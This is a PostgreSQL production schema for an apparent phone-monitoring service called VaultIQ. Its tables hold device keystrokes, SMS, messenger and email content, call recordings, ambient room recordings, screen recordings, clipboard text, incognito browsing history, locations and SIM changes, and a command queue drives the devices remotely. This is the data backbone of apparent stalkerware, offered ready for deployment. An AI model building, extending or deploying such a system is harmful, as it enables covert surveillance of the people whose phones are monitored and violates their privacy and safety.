-- =============================================
-- VAULTIQ ULTIMATE PRODUCTION SCHEMA - FULL RESTORATION
-- Includes all 32+ tables with Heartbeat and Settings Guard optimizations
-- =============================================

-- Enable required extensions
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pg_trgm";

-- 1. DEVICES
CREATE TABLE IF NOT EXISTS devices (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_name TEXT NOT NULL,
    device_token TEXT NOT NULL UNIQUE,
    device_model TEXT,
    os_version TEXT,
    battery_level INTEGER DEFAULT 0,
    is_charging BOOLEAN DEFAULT FALSE,
    last_seen TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_devices_last_seen ON devices(last_seen DESC);

-- 2. COMMANDS
CREATE TABLE IF NOT EXISTS commands (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    command TEXT NOT NULL,
    payload TEXT,
    status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending', 'executing', 'completed', 'failed')),
    result TEXT,
    executed_at TIMESTAMP WITH TIME ZONE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_commands_device_status ON commands(device_id, status);

-- 3. MONITORING DATA (All Tables Restored)
CREATE TABLE IF NOT EXISTS locations (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    latitude DOUBLE PRECISION NOT NULL,
    longitude DOUBLE PRECISION NOT NULL,
    accuracy REAL,
    altitude REAL,
    speed REAL,
    provider TEXT,
    battery_level INTEGER,
    is_charging BOOLEAN,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS call_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    contact_name TEXT,
    phone_number TEXT NOT NULL,
    call_type TEXT NOT NULL CHECK (call_type IN ('incoming', 'outgoing', 'missed', 'rejected', 'unknown')),
    duration_seconds INTEGER,
    call_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, phone_number, call_timestamp)
);

CREATE TABLE IF NOT EXISTS sms (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    contact_name TEXT,
    phone_number TEXT NOT NULL,
    message_type TEXT NOT NULL CHECK (message_type IN ('sent', 'received', 'draft', 'unknown')),
    content TEXT NOT NULL,
    sms_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, phone_number, content, sms_timestamp)
);

CREATE TABLE IF NOT EXISTS messenger_messages (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    messenger_type TEXT NOT NULL,
    conversation_id TEXT,
    contact_name TEXT,
    content TEXT,
    message_type TEXT NOT NULL CHECK (message_type IN ('sent', 'received')),
    message_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, messenger_type, contact_name, content, message_timestamp)
);

CREATE TABLE IF NOT EXISTS web_history (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    url TEXT NOT NULL,
    title TEXT,
    entry_time TIMESTAMP WITH TIME ZONE NOT NULL,
    exit_time TIMESTAMP WITH TIME ZONE,
    duration_seconds BIGINT,
    browsing_mode TEXT DEFAULT 'standard' CHECK (browsing_mode IN ('standard', 'incognito')),
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, url, entry_time)
);

CREATE TABLE IF NOT EXISTS app_usage (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    package_name TEXT NOT NULL,
    app_name TEXT,
    version_name TEXT,
    usage_time_seconds INTEGER NOT NULL,
    last_used_at TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, package_name, last_used_at)
);

CREATE TABLE IF NOT EXISTS photos (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    photo_url TEXT NOT NULL,
    thumbnail_url TEXT,
    file_size_bytes BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS screenshots (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    screenshot_url TEXT NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS keystrokes (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    text_content TEXT NOT NULL,
    app_name TEXT,
    package_name TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, package_name, text_content, recorded_at)
);

CREATE TABLE IF NOT EXISTS clipboard_entries (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    content TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS contacts (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    contact_id TEXT NOT NULL,
    display_name TEXT NOT NULL,
    phone_numbers TEXT[],
    emails TEXT[],
    photo_uri TEXT,
    starred BOOLEAN DEFAULT FALSE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, contact_id)
);

CREATE TABLE IF NOT EXISTS call_recordings (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    file_url TEXT NOT NULL,
    contact_name TEXT,
    phone_number TEXT,
    call_type TEXT,
    duration_seconds BIGINT,
    call_timestamp TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS email_entries (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    from_address TEXT,
    to_addresses TEXT[],
    subject TEXT,
    body TEXT,
    email_timestamp TIMESTAMP WITH TIME ZONE NOT NULL,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, from_address, subject, email_timestamp)
);

CREATE TABLE IF NOT EXISTS ambient_recordings (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    file_url TEXT NOT NULL,
    duration_seconds BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS screen_recordings (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    cloudinary_public_id TEXT NOT NULL UNIQUE,
    file_url TEXT NOT NULL,
    duration_seconds BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS risk_alerts (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    alert_type TEXT NOT NULL,
    severity TEXT NOT NULL DEFAULT 'medium' CHECK (severity IN ('low', 'medium', 'high', 'critical')),
    description TEXT NOT NULL,
    source TEXT,
    content TEXT,
    is_resolved BOOLEAN DEFAULT FALSE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS app_screen_context (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    app_package TEXT,
    app_name TEXT,
    screen_text TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS device_info (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    model TEXT,
    android_version TEXT,
    ram_available BIGINT,
    ram_total BIGINT,
    storage_available BIGINT,
    storage_total BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS network_info (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    wifi_ssid TEXT,
    network_type TEXT,
    signal_strength INTEGER,
    is_wifi_connected BOOLEAN DEFAULT FALSE,
    cell_id TEXT,
    location_area_code TEXT,
    mobile_country_code TEXT,
    mobile_network_code TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS installed_apps (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    package_name TEXT NOT NULL,
    app_name TEXT,
    version_name TEXT,
    is_system_app BOOLEAN DEFAULT FALSE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, package_name)
);

CREATE TABLE IF NOT EXISTS geofences (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    name TEXT NOT NULL,
    latitude DOUBLE PRECISION NOT NULL,
    longitude DOUBLE PRECISION NOT NULL,
    radius REAL NOT NULL,
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS wifi_history (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    ssid TEXT,
    bssid TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, bssid, recorded_at)
);

CREATE TABLE IF NOT EXISTS calendar_events (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    title TEXT,
    description TEXT,
    location TEXT,
    start_time TIMESTAMP WITH TIME ZONE,
    end_time TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, title, start_time)
);

CREATE TABLE IF NOT EXISTS app_traffic (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    package_name TEXT NOT NULL,
    app_name TEXT,
    bytes_sent BIGINT DEFAULT 0,
    bytes_received BIGINT DEFAULT 0,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, package_name, recorded_at)
);

CREATE TABLE IF NOT EXISTS sensor_data (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    proximity REAL,
    orientation TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS file_entries (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    file_path TEXT NOT NULL,
    file_name TEXT,
    is_directory BOOLEAN DEFAULT FALSE,
    size_bytes BIGINT DEFAULT 0,
    last_modified TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, file_path, last_modified)
);

CREATE TABLE IF NOT EXISTS blocked_apps (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    package_name TEXT NOT NULL,
    app_name TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    UNIQUE(device_id, package_name)
);

CREATE TABLE IF NOT EXISTS sim_changes (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    old_imsi TEXT,
    new_imsi TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS social_media_media (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    messenger_type TEXT,
    media_type TEXT,
    file_url TEXT,
    cloudinary_public_id TEXT UNIQUE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS remote_files (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    file_path TEXT NOT NULL,
    file_name TEXT,
    file_size BIGINT,
    is_directory BOOLEAN DEFAULT FALSE,
    last_modified TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 4. HOUSEKEEPING (Auto Pruning)
CREATE OR REPLACE FUNCTION prune_old_data() RETURNS trigger AS $$
BEGIN
  DELETE FROM locations WHERE recorded_at < NOW() - INTERVAL '60 days';
  DELETE FROM messenger_messages WHERE recorded_at < NOW() - INTERVAL '60 days';
  DELETE FROM sms WHERE recorded_at < NOW() - INTERVAL '60 days';
  RETURN NULL;
END;
$$ LANGUAGE plpgsql;

DROP TRIGGER IF EXISTS trigger_prune ON locations;
CREATE TRIGGER trigger_prune AFTER INSERT ON locations FOR EACH STATEMENT EXECUTE FUNCTION prune_old_data();

-- 5. SECURE ROW LEVEL SECURITY (RLS)
-- IMPORTANT: Row Level Security (RLS) must be properly configured for production
-- The following enables RLS but does NOT grant public access
-- You must implement proper authentication-based policies

DO $$
DECLARE
    tbl RECORD;
BEGIN
    FOR tbl IN (SELECT tablename FROM pg_tables WHERE schemaname = 'public')
    LOOP
        EXECUTE format('ALTER TABLE %I ENABLE ROW LEVEL SECURITY', tbl.tablename);
        EXECUTE format('DROP POLICY IF EXISTS "Enable all access" ON %I', tbl.tablename);
        -- NOTE: Removed dangerous USING (true) policy
        -- Implement proper policies like:
        -- CREATE POLICY "Users can view their own devices" ON devices
        --   FOR SELECT USING (auth.uid() = user_id);
    END LOOP;
END $$;

-- Example of proper RLS policy for devices table (uncomment and customize):
-- CREATE POLICY "Users can view own devices" ON devices
--   FOR SELECT USING (auth.uid()::text = device_token::text);
-- 
-- CREATE POLICY "Users can insert own devices" ON devices
--   FOR INSERT WITH CHECK (auth.uid()::text = device_token::text);
-- 
-- CREATE POLICY "Users can update own devices" ON devices
--   FOR UPDATE USING (auth.uid()::text = device_token::text);

-- 6. TRIGGERS
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_devices_modtime BEFORE UPDATE ON devices FOR EACH ROW EXECUTE PROCEDURE update_updated_at_column();
CREATE TRIGGER update_commands_modtime BEFORE UPDATE ON commands FOR EACH ROW EXECUTE PROCEDURE update_updated_at_column();
